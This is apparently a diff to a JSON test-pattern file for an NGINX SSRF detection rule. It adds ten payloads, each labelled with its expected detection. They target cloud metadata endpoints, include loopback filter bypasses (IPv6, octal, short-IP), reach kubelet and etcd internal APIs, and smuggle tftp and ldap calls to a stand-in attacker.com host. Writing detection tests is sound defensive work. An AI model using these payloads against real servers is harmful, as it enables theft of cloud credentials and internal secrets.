@@ -2,10 +2,10 @@
   "metadata": {
     "category": "ssrf",
     "description": "Server-Side Request Forgery (SSRF) attack patterns",
-    "total_patterns": 15,
-    "phase": "Phase 9 Stage 1",
+    "total_patterns": 25,
+    "phase": "Phase 10 Stage 1",
     "created": "2026-02-11",
-    "updated": "2026-02-12"
+    "updated": "2026-02-14"
   },
   "patterns": [
     {
@@ -192,6 +192,136 @@
       "severity": "high",
       "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
       "description": "Phase 9: Tests dict:// protocol condition (previously uncovered)"
+    },
+    {
+      "id": "SSRF_CLOUD_006",
+      "name": "DigitalOcean Metadata Service Access",
+      "category": "ssrf",
+      "subcategory": "cloud_metadata",
+      "payload": "http://169.254.169.254/metadata/v1/",
+      "encoded": "http%3A%2F%2F169.254.169.254%2Fmetadata%2Fv1%2F",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: DigitalOcean metadata endpoint"
+    },
+    {
+      "id": "SSRF_CLOUD_007",
+      "name": "AWS IMDSv2 Hostname Metadata Access",
+      "category": "ssrf",
+      "subcategory": "cloud_metadata",
+      "payload": "http://169.254.169.254/latest/meta-data/hostname",
+      "encoded": "http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fhostname",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: AWS IMDSv2 hostname metadata extraction"
+    },
+    {
+      "id": "SSRF_CLOUD_008",
+      "name": "Oracle Cloud Instance Metadata Access",
+      "category": "ssrf",
+      "subcategory": "cloud_metadata",
+      "payload": "http://169.254.169.254/opc/v1/instance/",
+      "encoded": "http%3A%2F%2F169.254.169.254%2Fopc%2Fv1%2Finstance%2F",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: Oracle Cloud Infrastructure metadata"
+    },
+    {
+      "id": "SSRF_DNS_003",
+      "name": "IPv6 Loopback SSRF Bypass",
+      "category": "ssrf",
+      "subcategory": "dns_rebinding",
+      "payload": "http://[::1]/",
+      "encoded": "http%3A%2F%2F%5B%3A%3A1%5D%2F",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: IPv6 loopback address bypass (requires rule condition addition)"
+    },
+    {
+      "id": "SSRF_DNS_004",
+      "name": "Octal IP Loopback SSRF Bypass",
+      "category": "ssrf",
+      "subcategory": "dns_rebinding",
+      "payload": "http://0177.0.0.1/",
+      "encoded": "http%3A%2F%2F0177.0.0.1%2F",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: Octal IP representation bypass (requires rule condition addition)"
+    },
+    {
+      "id": "SSRF_DNS_005",
+      "name": "Short IP Loopback SSRF Bypass",
+      "category": "ssrf",
+      "subcategory": "dns_rebinding",
+      "payload": "http://127.1/",
+      "encoded": "http%3A%2F%2F127.1%2F",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: Short IP notation bypass (requires rule condition addition)"
+    },
+    {
+      "id": "SSRF_INT_006",
+      "name": "Kubernetes Kubelet API Access",
+      "category": "ssrf",
+      "subcategory": "internal_service",
+      "payload": "http://localhost:10250/pods",
+      "encoded": "http%3A%2F%2Flocalhost%3A10250%2Fpods",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: K8s kubelet API for pod information"
+    },
+    {
+      "id": "SSRF_INT_007",
+      "name": "etcd API Key Extraction",
+      "category": "ssrf",
+      "subcategory": "internal_service",
+      "payload": "http://localhost:2379/v2/keys",
+      "encoded": "http%3A%2F%2Flocalhost%3A2379%2Fv2%2Fkeys",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: etcd key-value store extraction"
+    },
+    {
+      "id": "SSRF_SCHEME_004",
+      "name": "TFTP Protocol SSRF",
+      "category": "ssrf",
+      "subcategory": "protocol_smuggling",
+      "payload": "tftp://attacker.com/file",
+      "encoded": "tftp%3A%2F%2Fattacker.com%2Ffile",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: TFTP protocol for file exfiltration (requires rule condition addition)"
+    },
+    {
+      "id": "SSRF_SCHEME_005",
+      "name": "LDAP Protocol SSRF",
+      "category": "ssrf",
+      "subcategory": "protocol_smuggling",
+      "payload": "ldap://attacker.com/dc=example",
+      "encoded": "ldap%3A%2F%2Fattacker.com%2Fdc%3Dexample",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SSRF] SSRF attack attempt detected",
+      "description": "Phase 10: LDAP protocol for directory enumeration (requires rule condition addition)"
     }
   ]
 }
